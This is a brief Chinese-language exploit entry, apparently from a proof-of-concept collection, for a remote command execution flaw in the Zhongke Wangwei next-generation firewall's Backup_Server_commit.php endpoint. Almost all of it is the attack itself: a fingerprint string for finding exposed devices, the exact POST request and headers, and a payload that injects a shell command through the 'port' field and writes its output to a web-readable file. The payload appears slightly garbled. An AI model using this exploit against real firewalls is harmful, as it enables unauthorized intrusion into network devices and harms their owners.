# 中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞

- **系统**：中科网威下一代防火墙控制系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="Get_Verify_Info(hex_md5(user_string)."`
- **请求**：`POST /view/DBManage/Backup_Server_commit.php?action=test HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 45`　`Sec-Fetch-User: ?1`　`Priority: u=4`

**请求体 / payload**
```
host=&mode=0&port=;echo%20%60whoami%60%20tee%20/tmp/www/reporter/test.txtwhoami&user=&password=&ftppath=
路径定位：http://ip/test.txt
```
- **预期**：200　|　—